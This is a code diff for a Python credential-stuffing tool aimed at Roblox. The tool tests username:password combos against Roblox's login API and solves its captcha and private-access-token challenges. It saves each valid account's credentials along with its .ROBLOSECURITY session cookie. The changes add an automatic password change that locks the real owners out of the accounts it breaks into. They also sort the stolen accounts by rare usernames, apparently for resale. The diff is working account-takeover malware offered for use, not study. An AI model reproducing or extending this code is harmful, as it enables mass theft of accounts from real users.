@@ -1,4 +1,4 @@
-import sys, os
+import sys, os, random, string
 from time import sleep
 from json import loads, dumps
 from base64 import b64decode, b64encode
@@ -11,6 +11,7 @@ from account_info import AccountInfo
 from auth_intent import AuthIntent
 from rostile import Rostile
 from util import Util
+from secure import Secure
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
@@ -25,15 +26,33 @@ if type(WEBHOOK_ENABLED) != bool:
     Output("ERROR").log("You must put either true/false for webhook enabled")
 
 WEBHOOK = config["webhook"]
+AUTO_SECURE = config.get("autoSecure", {"password": {"enabled": False, "prefix": "", "skipLength": 25}})
+
+def load_dictionary_set(path: str) -> set:
+    entries = set()
+    if not os.path.exists(path):
+        return entries
+    with open(path, "r", encoding="utf-8", errors="replace") as file:
+        for line in file:
+            value = line.strip()
+            if not value:
+                continue
+            entries.add(value.lower())
+    return entries
+
+DICTIONARY = load_dictionary_set("input/dictionary.txt")
 
 class Roblox:
-    def __init__(self, lock: ThreadLock, counter: Counter, accounts) -> None:
+    def __init__(self, lock: ThreadLock, counter: Counter, accounts, skip_combos: set) -> None:
         self.account = None
         self.attempts = 0
         self.checked = False
         self.lock = lock
         self.counter = counter
         self.accounts = accounts
+        self.skip_combos = skip_combos
+        self.login_value = None
+        self.original_mail = None
 
     def continue_check(self, continue_payload) -> None:
         sleep(1)
@@ -112,6 +131,8 @@ class Roblox:
                     with self.lock.get_lock():
                         self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                         self.counter.increment()
+                        self.login_value = self.account[0]
+                        self.original_mail = self.account[2] if len(self.account) >= 3 else None
                 else:
                     if self.attempts == 10:
                         self.checked = False
@@ -120,11 +141,10 @@ class Roblox:
                         with self.lock.get_lock():
                             self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                             self.counter.increment()
+                            self.login_value = self.account[0]
+                            self.original_mail = self.account[2] if len(self.account) >= 3 else None
 
-                        Output("ERROR").log(f"Invalid account | {self.account[0]}")
-
-                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
-                            file.write(f'{self.account[0]}:{self.account[1]}\n')
+                        Output("ERROR").log(f"Max retries reached | {self.account[0]}")
                 
                 Output("INFO").log(f"Checking account | {self.account[0]}")
 
@@ -211,240 +231,248 @@ class Roblox:
                     raise ValueError("Rate limited")
                 
                 if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                    if self.login_value != None and "@" in self.login_value:
+                        Output("SUCCESS").log(f"Valid mail | {self.login_value}")
+                    else:
+                        Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
                     self.handle_multi(user_id_and_cookie)
 
                     self.checked = True
-                    continue
-
-                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
-                    user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
-
-                    self.account[0] = response.json()["user"]["name"]
-
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
-
-                    cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"
-
-                    self.handle_valid(user_id_and_cookie, cookie_header)
-                    
-                    self.checked = True
-                    continue
-                
-                elif "Challenge" in response.text:
-                    pass
-
                 else:
-                    raise ValueError("invalid")
-                
-                challenge_type = response.headers.get("rblx-challenge-type")
+                    if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
+                        user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
 
-                if challenge_type == "denied":
-                    raise ValueError("Challenge type denied")
+                        self.account[0] = response.json()["user"]["name"]
 
-                challenge_id = response.headers.get("rblx-challenge-id")
-                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
-                blob = metadata.get("dataExchangeBlob")
-                captcha_id = metadata.get("unifiedCaptchaId")
+                        if self.login_value != None and "@" in self.login_value:
+                            Output("SUCCESS").log(f"Valid mail | {self.login_value}")
+                        else:
+                            Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
-                if cookie_header.endswith("; "):
-                    cookie_header = cookie_header[:-2]
+                        cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"
 
-                if challenge_type == "rostile":
-                    Output("CAPTCHA").log("Rostile detected")
-
-                    payload = Rostile.get_solution(challenge_id)
-
-                    redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload)
-
-                    csrf = redemption_token.headers.get("x-csrf-token")
-
-                    if csrf != None:
-                        self.session.headers = {
-                            **self.session.headers,
-                            "x-csrf-token": csrf
-                        }
-
-                        redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload).json()["redemptionToken"]
-                    else:
-                        redemption_token = redemption_token.json()["redemptionToken"]
-
-                    challenge_metadata = dumps({
-                        "redemptionToken": redemption_token
-                    }, separators=(',', ':'))
-
-                    payload = {
-                        "challengeId": challenge_id,
-                        "challengeType": "rostile",
-                        "challengeMetadata": challenge_metadata
-                    }
-
-                    continue_result = self.continue_check(payload)
-
-                    if type(continue_result) == dict:
-                        captcha_id = continue_result.get("unifiedCaptchaId")
-                        blob = continue_result.get("dataExchangeBlob")
-
-                        Output("CAPTCHA").log("Captcha detected")
+                        self.handle_valid(user_id_and_cookie, cookie_header)
+                        
+                        self.checked = True
+                        continue
                     
-                        Output("CAPTCHA").log("Solving captcha")
+                    elif "Challenge" in response.text:
+                        pass
 
-                        solution = get_token(self.session, blob, self.proxy)
+                    else:
+                        raise ValueError("invalid")
+                
+                if not self.checked:
+                    challenge_type = response.headers.get("rblx-challenge-type")
 
-                        if solution == None:
-                            raise ValueError("Failed to solve captcha")
-                        
-                        token = solution.split("|")[0]
-                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
+                    if challenge_type == "denied":
+                        raise ValueError("Challenge type denied")
 
-                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
-                        
+                    challenge_id = response.headers.get("rblx-challenge-id")
+                    metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
+                    blob = metadata.get("dataExchangeBlob")
+                    captcha_id = metadata.get("unifiedCaptchaId")
+
+                    if cookie_header.endswith("; "):
+                        cookie_header = cookie_header[:-2]
+
+                    if challenge_type == "rostile":
+                        Output("CAPTCHA").log("Rostile detected")
+
+                        payload = Rostile.get_solution(challenge_id)
+
+                        redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload)
+
+                        csrf = redemption_token.headers.get("x-csrf-token")
+
+                        if csrf != None:
+                            self.session.headers = {
+                                **self.session.headers,
+                                "x-csrf-token": csrf
+                            }
+
+                            redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload).json()["redemptionToken"]
+                        else:
+                            redemption_token = redemption_token.json()["redemptionToken"]
+
                         challenge_metadata = dumps({
-                            "unifiedCaptchaId": captcha_id,
-                            "captchaToken": solution,
-                            "actionType": "Login"
+                            "redemptionToken": redemption_token
                         }, separators=(',', ':'))
 
                         payload = {
                             "challengeId": challenge_id,
-                            "challengeType": "captcha",
+                            "challengeType": "rostile",
                             "challengeMetadata": challenge_metadata
                         }
 
-                        user_id_and_cookie = self.continue_check(payload)
-                    else:
-                        user_id_and_cookie = continue_result
+                        continue_result = self.continue_check(payload)
 
-                elif challenge_type == "privateaccesstoken":
-                    Output("CAPTCHA").log("PAT detected")
+                        if type(continue_result) == dict:
+                            captcha_id = continue_result.get("unifiedCaptchaId")
+                            blob = continue_result.get("dataExchangeBlob")
 
-                    payload = {"challengeId": challenge_id}
-
-                    response = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload)
-
-                    self.session.headers["Authorization"] = f"PrivateToken token={response.headers['www-authenticate'].split('challenge=')[1]}"
-
-                    redemption_token = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload).json()["redemptionToken"]
-
-                    challenge_metadata = dumps({
-                        "redemptionToken": redemption_token
-                    }, separators=(',', ':'))
-
-                    payload = {
-                        "challengeId": challenge_id,
-                        "challengeType": "privateaccesstoken",
-                        "challengeMetadata": challenge_metadata
-                    }
-
-                    continue_result = self.continue_check(payload)
-
-                    if type(continue_result) == dict:
-                        captcha_id = continue_result.get("unifiedCaptchaId")
-                        blob = continue_result.get("dataExchangeBlob")
-
-                        Output("CAPTCHA").log("Captcha detected")
+                            Output("CAPTCHA").log("Captcha detected")
                     
-                        Output("CAPTCHA").log("Solving captcha")
-
-                        solution = get_token(self.session, blob, self.proxy)
-
-                        if solution == None:
-                            raise ValueError("Failed to solve captcha")
-                        
-                        token = solution.split("|")[0]
-                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
-
-                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
-                        
-                        challenge_metadata = dumps({
-                            "unifiedCaptchaId": captcha_id,
-                            "captchaToken": solution,
-                            "actionType": "Login"
-                        }, separators=(',', ':'))
-
-                        payload = {
-                            "challengeId": challenge_id,
-                            "challengeType": "captcha",
-                            "challengeMetadata": challenge_metadata
-                        }
-
-                        user_id_and_cookie = self.continue_check(payload)
-                    else:
-                        user_id_and_cookie = continue_result
-
-                else:
-                    Output("CAPTCHA").log("Captcha detected")
-                    
-                    Output("CAPTCHA").log("Solving captcha")
-
-                    solution = get_token(self.session, blob, self.proxy)
-
-                    attmepts = 1
-
-                    if solution == None:
-                        while True:
-                            Output("CAPTCHA").log("Retrying captcha")
-
-                            if attmepts == 2:
-                                raise ValueError("Failed to solve captcha.")
-
-                            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-
-                            if response.status_code == 429:
-                                raise ValueError("Rate limited")
-
-                            challenge_type = response.headers.get("rblx-challenge-type")
-
-                            if challenge_type == "denied":
-                                raise ValueError("Challenge type denied")
-
-                            challenge_id = response.headers.get("rblx-challenge-id")
-                            metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
-                            blob = metadata.get("dataExchangeBlob")
-                            captcha_id = metadata.get("unifiedCaptchaId")
+                            Output("CAPTCHA").log("Solving captcha")
 
                             solution = get_token(self.session, blob, self.proxy)
 
-                            if solution != None:
-                                break
-                            
-                            attmepts += 1
+                            if solution == None:
+                                raise ValueError("Failed to solve captcha")
+                        
+                            token = solution.split("|")[0]
+                            token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
 
-                    token = solution.split("|")[0]
-                    token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
+                            Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
+                        
+                            challenge_metadata = dumps({
+                                "unifiedCaptchaId": captcha_id,
+                                "captchaToken": solution,
+                                "actionType": "Login"
+                            }, separators=(',', ':'))
 
-                    Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
+                            payload = {
+                                "challengeId": challenge_id,
+                                "challengeType": "captcha",
+                                "challengeMetadata": challenge_metadata
+                            }
+
+                            user_id_and_cookie = self.continue_check(payload)
+                        else:
+                            user_id_and_cookie = continue_result
+
+                    elif challenge_type == "privateaccesstoken":
+                        Output("CAPTCHA").log("PAT detected")
+
+                        payload = {"challengeId": challenge_id}
+
+                        response = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload)
+
+                        self.session.headers["Authorization"] = f"PrivateToken token={response.headers['www-authenticate'].split('challenge=')[1]}"
+
+                        redemption_token = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload).json()["redemptionToken"]
+
+                        challenge_metadata = dumps({
+                            "redemptionToken": redemption_token
+                        }, separators=(',', ':'))
+
+                        payload = {
+                            "challengeId": challenge_id,
+                            "challengeType": "privateaccesstoken",
+                            "challengeMetadata": challenge_metadata
+                        }
+
+                        continue_result = self.continue_check(payload)
+
+                        if type(continue_result) == dict:
+                            captcha_id = continue_result.get("unifiedCaptchaId")
+                            blob = continue_result.get("dataExchangeBlob")
+
+                            Output("CAPTCHA").log("Captcha detected")
                     
-                    challenge_metadata = dumps({
-                        "unifiedCaptchaId": captcha_id,
-                        "captchaToken": solution,
-                        "actionType": "Login"
-                    }, separators=(',', ':'))
+                            Output("CAPTCHA").log("Solving captcha")
 
-                    payload = {
-                        "challengeId": challenge_id,
-                        "challengeType": "captcha",
-                        "challengeMetadata": challenge_metadata
-                    }
+                            solution = get_token(self.session, blob, self.proxy)
 
-                    user_id_and_cookie = self.continue_check(payload)
+                            if solution == None:
+                                raise ValueError("Failed to solve captcha")
+                        
+                            token = solution.split("|")[0]
+                            token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
 
-                if type(user_id_and_cookie) == dict:
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                            Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
+                        
+                            challenge_metadata = dumps({
+                                "unifiedCaptchaId": captcha_id,
+                                "captchaToken": solution,
+                                "actionType": "Login"
+                            }, separators=(',', ':'))
 
-                    self.handle_multi(user_id_and_cookie)
+                            payload = {
+                                "challengeId": challenge_id,
+                                "challengeType": "captcha",
+                                "challengeMetadata": challenge_metadata
+                            }
 
-                    self.checked = True
-                    continue
+                            user_id_and_cookie = self.continue_check(payload)
+                        else:
+                            user_id_and_cookie = continue_result
 
-                Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                    else:
+                        Output("CAPTCHA").log("Captcha detected")
+                    
+                        Output("CAPTCHA").log("Solving captcha")
 
-                cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"
+                        solution = get_token(self.session, blob, self.proxy)
 
-                self.handle_valid(user_id_and_cookie, cookie_header)
+                        attmepts = 1
 
-                self.checked = True
+                        if solution == None:
+                            while True:
+                                Output("CAPTCHA").log("Retrying captcha")
+
+                                if attmepts == 2:
+                                    raise ValueError("Failed to solve captcha.")
+
+                                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)
+
+                                if response.status_code == 429:
+                                    raise ValueError("Rate limited")
+
+                                challenge_type = response.headers.get("rblx-challenge-type")
+
+                                if challenge_type == "denied":
+                                    raise ValueError("Challenge type denied")
+
+                                challenge_id = response.headers.get("rblx-challenge-id")
+                                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
+                                blob = metadata.get("dataExchangeBlob")
+                                captcha_id = metadata.get("unifiedCaptchaId")
+
+                                solution = get_token(self.session, blob, self.proxy)
+
+                                if solution != None:
+                                    break
+                            
+                                attmepts += 1
+
+                        token = solution.split("|")[0]
+                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]
+
+                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
+                    
+                        challenge_metadata = dumps({
+                            "unifiedCaptchaId": captcha_id,
+                            "captchaToken": solution,
+                            "actionType": "Login"
+                        }, separators=(',', ':'))
+
+                        payload = {
+                            "challengeId": challenge_id,
+                            "challengeType": "captcha",
+                            "challengeMetadata": challenge_metadata
+                        }
+
+                        user_id_and_cookie = self.continue_check(payload)
+
+                    if type(user_id_and_cookie) == dict:
+                        if self.login_value != None and "@" in self.login_value:
+                            Output("SUCCESS").log(f"Valid mail | {self.login_value}")
+                        else:
+                            Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+
+                        self.handle_multi(user_id_and_cookie)
+
+                        self.checked = True
+                    else:
+                        Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+
+                        cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"
+
+                        self.handle_valid(user_id_and_cookie, cookie_header)
+
+                        self.checked = True
 
             except Exception as e:
                 if str(e) == "invalid":
@@ -455,16 +483,14 @@ class Roblox:
                     with self.lock.get_lock():
                         with open("output/invalid.txt", "a", encoding="utf-8") as file:
                             file.write(f'{self.account[0]}:{self.account[1]}\n')
+                        self.skip_combos.add(f"{self.account[0]}:{self.account[1]}")
                 else:
                     Output("ERROR").log(str(e))
 
                     self.attempts += 1
 
     def handle_valid(self, user_id_and_cookie, cookie_header) -> None:
-        with self.lock.get_lock():
-            with open("output/valid.txt", "a", encoding="utf-8") as file:
-                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
-
+        old_password = self.account[1]
         self.session.headers = {
             'sec-ch-ua-platform': '"Windows"',
             'sec-ch-ua': self.sec_ch_ua,
@@ -482,6 +508,65 @@ class Roblox:
             'priority': 'u=1, i',
             "cookie": cookie_header
         }
+
+        password_settings = AUTO_SECURE.get("password", {})
+        if password_settings.get("enabled", False):
+            skip_length = password_settings.get("skipLength", 25)
+            if skip_length is not None and len(self.account[1]) == skip_length:
+                Output("INFO").log("Skipping password change (password length match)")
+            else:
+                csrf = self.session.post("https://auth.roblox.com/v2/logout").headers.get("x-csrf-token")
+                if csrf:
+                    self.session.headers = {
+                        **self.session.headers,
+                        "x-csrf-token": csrf
+                    }
+                new_password = password_settings.get("prefix", "") + ''.join(
+                    random.SystemRandom().choice(string.ascii_letters + string.digits)
+                    for _ in range(25)
+                )
+                try:
+                    changed, new_cookie = Secure.change_password(
+                        self.session,
+                        new_password,
+                        self.account[1],
+                        self.sec_auth_intent
+                    )
+                    if changed:
+                        self.account[1] = new_password
+                    if new_cookie:
+                        user_id_and_cookie[1] = new_cookie
+                        cookie_header = cookie_header.split("; .ROBLOSECURITY=")[0] + f"; .ROBLOSECURITY={new_cookie}"
+                        self.session.headers = {
+                            **self.session.headers,
+                            "cookie": cookie_header
+                        }
+                except Exception as e:
+                    Output("ERROR").log(str(e))
+
+        with self.lock.get_lock():
+            with open("output/valid.txt", "a", encoding="utf-8") as file:
+                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
+            with open("output/originalcombo.txt", "a", encoding="utf-8") as file:
+                if self.original_mail != None:
+                    file.write(f'{self.account[0]}:{old_password}:{self.original_mail}\n')
+                elif self.login_value != None and "@" in self.login_value:
+                    file.write(f'{self.account[0]}:{old_password}:{self.login_value}\n')
+                else:
+                    file.write(f'{self.account[0]}:{old_password}\n')
+            self.skip_combos.add(f"{self.account[0]}:{old_password}")
+            if self.account[1] != old_password:
+                self.skip_combos.add(f"{self.account[0]}:{self.account[1]}")
+            if self.login_value != None:
+                self.skip_combos.add(f"{self.login_value}:{old_password}")
+                if self.account[1] != old_password:
+                    self.skip_combos.add(f"{self.login_value}:{self.account[1]}")
+            if self.original_mail != None:
+                self.skip_combos.add(f"{self.original_mail}:{old_password}")
+                if self.account[1] != old_password:
+                    self.skip_combos.add(f"{self.original_mail}:{self.account[1]}")
+
+        self.log_user_categories(self.account[0], f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}')
 
         acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie[0])
 
@@ -537,17 +622,52 @@ class Roblox:
                 with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                     file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
 
-    def handle_multi(self, user_id_and_cookie) -> None:
-        multiple_accounts_list = []
-
-        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]
-
-        for multiple_account in multiple_accounts:
-            multiple_accounts_list.append(f'{multiple_account.get("name")}:{self.account[1]}\n')
+    def log_user_categories(self, username: str, combo: str) -> None:
+        lowered = username.lower()
+        length = len(username)
 
         with self.lock.get_lock():
-            with open("output/multiple_linked.txt", "a", encoding="utf-8") as file:
-                file.writelines(multiple_accounts_list)
+            os.makedirs("output/users", exist_ok=True)
+
+            if lowered in DICTIONARY:
+                with open("output/users/snipes.txt", "a", encoding="utf-8") as file:
+                    file.write(f"{combo}\n")
+
+            if username.isdigit():
+                with open("output/users/numbers.txt", "a", encoding="utf-8") as file:
+                    file.write(f"{combo}\n")
+
+            if length == 3:
+                with open("output/users/3c.txt", "a", encoding="utf-8") as file:
+                    file.write(f"{combo}\n")
+                if username.isalpha():
+                    with open("output/users/3l.txt", "a", encoding="utf-8") as file:
+                        file.write(f"{combo}\n")
+
+            if length == 4:
+                with open("output/users/4c.txt", "a", encoding="utf-8") as file:
+                    file.write(f"{combo}\n")
+                if username.isalpha():
+                    with open("output/users/4l.txt", "a", encoding="utf-8") as file:
+                        file.write(f"{combo}\n")
+
+    def handle_multi(self, user_id_and_cookie) -> None:
+        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]
+
+        with self.lock.get_lock():
+            for multiple_account in multiple_accounts:
+                username = multiple_account.get("name")
+                if f"{username}:{self.account[1]}" in self.skip_combos:
+                    if self.login_value != None and "@" in self.login_value:
+                        Output("INFO").log(f"Skipped {username} (already checked)")
+                    else:
+                        Output("INFO").log(f"Skipped {username} (already checked)")
+                    continue
+                if self.login_value != None and "@" in self.login_value:
+                    combo = f"{username}:{self.account[1]}:{self.login_value}\n"
+                else:
+                    combo = f"{username}:{self.account[1]}\n"
+                self.accounts.insert(self.counter.get_value() + 1, combo)
 
         if WEBHOOK_ENABLED:
             try:
